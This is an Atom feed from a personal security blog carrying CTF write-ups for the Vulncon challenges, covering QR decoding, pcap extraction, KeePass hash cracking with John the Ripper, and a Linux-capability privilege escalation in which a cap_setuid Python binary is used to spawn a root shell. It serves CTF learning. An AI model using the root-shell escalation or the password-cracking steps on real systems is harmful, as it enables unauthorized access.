<?xml version="1.0" encoding="utf-8"?><feed xmlns="http://www.w3.org/2005/Atom" ><generator uri="https://jekyllrb.com/" version="3.9.0">Jekyll</generator><link href="http://localhost:4000/feed.xml" rel="self" type="application/atom+xml" /><link href="http://localhost:4000/" rel="alternate" type="text/html" /><updated>2020-12-21T11:37:08+02:00</updated><id>http://localhost:4000/feed.xml</id><title type="html">j11b0’s blog</title><subtitle>My writings on cybersecurity.</subtitle><entry><title type="html">Vulncon CTF writeups</title><link href="http://localhost:4000/ctf/2020/12/20/vulncon-CTF-writeups.html" rel="alternate" type="text/html" title="Vulncon CTF writeups" /><published>2020-12-20T12:59:36+02:00</published><updated>2020-12-20T12:59:36+02:00</updated><id>http://localhost:4000/ctf/2020/12/20/vulncon%20CTF%20writeups</id><content type="html" xml:base="http://localhost:4000/ctf/2020/12/20/vulncon-CTF-writeups.html">&lt;p&gt;These are the writeups for the &lt;a href=&quot;https://ctf.noobarmy.org/&quot;&gt;Vulncon CTF&lt;/a&gt; challenges that I personally solved.&lt;/p&gt;

&lt;h2 id=&quot;maze&quot;&gt;Maze&lt;/h2&gt;

&lt;p&gt;&lt;a href=&quot;http://maze.noobarmy.org/&quot;&gt;http://maze.noobarmy.org/&lt;/a&gt;&lt;/p&gt;

&lt;p&gt;Use gobuster to find out subdirectory &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;/projects&lt;/code&gt;. Navigate there and from the source we find out how to access some images:&lt;/p&gt;
&lt;div class=&quot;language-html highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt; &lt;span class=&quot;c&quot;&gt;&amp;lt;!--
  &amp;lt;img src=&quot;justsomerandomfoldername/image-0.png&quot;&amp;gt;
 --&amp;gt;&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;These are QR-codes. Let’s dump their contents with a Python script:&lt;/p&gt;

&lt;div class=&quot;language-python highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;requests&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;io&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;pyzbar.pyzbar&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;
&lt;span class=&quot;kn&quot;&gt;from&lt;/span&gt; &lt;span class=&quot;nn&quot;&gt;PIL&lt;/span&gt; &lt;span class=&quot;kn&quot;&gt;import&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;

&lt;span class=&quot;k&quot;&gt;for&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;i&lt;/span&gt; &lt;span class=&quot;ow&quot;&gt;in&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;range&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;28&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;):&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;r&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;requests&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;get&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'http://maze.noobarmy.org/projects/justsomerandomfoldername/image-{0}.png'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;format&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;i&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;Image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;open&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;io&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;BytesIO&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;r&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;content&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;))&lt;/span&gt;
    &lt;span class=&quot;n&quot;&gt;decoded&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; &lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;image&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
    &lt;span class=&quot;k&quot;&gt;print&lt;/span&gt; &lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decoded&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;mi&quot;&gt;0&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;].&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;data&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;.&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;decode&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;'utf-8'&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;+&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;' '&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;,&lt;/span&gt;&lt;span class=&quot;n&quot;&gt;end&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;&lt;span class=&quot;s&quot;&gt;''&lt;/span&gt;&lt;span class=&quot;p&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Output:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;Hello and welcome to this challenge! We hope that collecting these images 
was not that hard for you, anyways just so you know i love the number 13
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Let’s take a closer look at 13:&lt;/p&gt;

&lt;p&gt;&lt;img src=&quot;http://localhost:4000/assets/txTchqF.png&quot; alt=&quot;QR Code&quot; /&gt;&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;exiftool image-13.png | &lt;span class=&quot;nb&quot;&gt;grep &lt;/span&gt;Creator
Creator: aWh5YXBiYXtqQCRfN3UxJF8zaTNhX0BfajNvX3B1QHl5M2F0Mz99
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Copy the string to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt;. add the following recipes: base64 decode and ROT-13.&lt;/p&gt;

&lt;h2 id=&quot;capacity&quot;&gt;CAPacity&lt;/h2&gt;

&lt;p&gt;As the name suggests this challenge is about abusing Linux capabilities.&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/sbin/getcap &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; / 2&amp;gt;/dev/null
/usr/bin/python2.7 &lt;span class=&quot;o&quot;&gt;=&lt;/span&gt; cap_setuid+ep

&lt;span class=&quot;nv&quot;&gt;$ &lt;/span&gt;/usr/bin/python2.7 &lt;span class=&quot;nt&quot;&gt;-c&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'import os; os.setuid(0); os.system(&quot;/bin/sh&quot;)'&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# id&lt;/span&gt;
&lt;span class=&quot;nv&quot;&gt;uid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;0&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;root&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nv&quot;&gt;gid&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shhhhhh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;nb&quot;&gt;groups&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;1000&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;shhhhhh&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;span class=&quot;c&quot;&gt;# cat /root/flag.txt&lt;/span&gt;
vulncon&lt;span class=&quot;o&quot;&gt;{&lt;/span&gt;TW9kZS1TX0hleGNvZGUK&lt;span class=&quot;o&quot;&gt;}&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
&lt;p&gt;Too bad this challenge was pulled since root access was a threat to the infrastructure.&lt;/p&gt;

&lt;h2 id=&quot;pcaped&quot;&gt;Pcaped&lt;/h2&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;tshark &lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt; Data.pcapng &lt;span class=&quot;nt&quot;&gt;-e&lt;/span&gt; data &lt;span class=&quot;nt&quot;&gt;-T&lt;/span&gt; fields | &lt;span class=&quot;nb&quot;&gt;tr&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'\n'&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;Copy the string to &lt;a href=&quot;https://gchq.github.io/CyberChef/&quot;&gt;CyberChef&lt;/a&gt;. add the folloiwing recipes from HEX, remove whitespace and from Base64.&lt;/p&gt;

&lt;h2 id=&quot;johnny&quot;&gt;Johnny&lt;/h2&gt;

&lt;p&gt;Make two wordlists:&lt;/p&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;John
Ripper
Cracker
John37
Ripper37
Cracker37
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;div class=&quot;language-plaintext highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;!
&quot;
#
%
&amp;amp;
$
@
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;use hashcat-utils to combine into a wordlist:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;/usr/lib/hashcat-utils/combinator.bin 1.txt words &lt;span class=&quot;o&quot;&gt;&amp;gt;&lt;/span&gt; 2.txt    
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;repeat until you have word-symbol-word-symbol-word combination. Run through John The Ripper:&lt;/p&gt;

&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;nb&quot;&gt;sudo &lt;/span&gt;john hash.txt &lt;span class=&quot;nt&quot;&gt;--wordlist&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;=&lt;/span&gt;final.txt 
John37@Cracker@Ripper &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;Confidential&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;

&lt;p&gt;open up the keepass file and look at the flag:&lt;/p&gt;

&lt;p&gt;&lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;Programming_Is_Necessary_For Cyber_Right?&lt;/code&gt;&lt;/p&gt;

&lt;p&gt;Fix it by adding the missing &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;_&lt;/code&gt; and submit.&lt;/p&gt;</content><author><name></name></author><category term="ctf" /><summary type="html">These are the writeups for the Vulncon CTF challenges that I personally solved.</summary></entry><entry><title type="html">X-MAS CTF writeups</title><link href="http://localhost:4000/ctf/2020/12/17/X-MAS-CTF-writeups.html" rel="alternate" type="text/html" title="X-MAS CTF writeups" /><published>2020-12-17T12:59:36+02:00</published><updated>2020-12-17T12:59:36+02:00</updated><id>http://localhost:4000/ctf/2020/12/17/X-MAS%20CTF%20writeups</id><content type="html" xml:base="http://localhost:4000/ctf/2020/12/17/X-MAS-CTF-writeups.html">&lt;p&gt;These are the writeups for the &lt;a href=&quot;https://ctf.noobarmy.org/&quot;&gt;X-MAS CTF&lt;/a&gt; challenges that I personally solved.&lt;/p&gt;

&lt;script src=&quot;https://gist.github.com/3183bdb9f38fe52a3947064ed0e3bd4a.js&quot;&gt; &lt;/script&gt;</content><author><name></name></author><category term="ctf" /><summary type="html">These are the writeups for the X-MAS CTF challenges that I personally solved.</summary></entry></feed>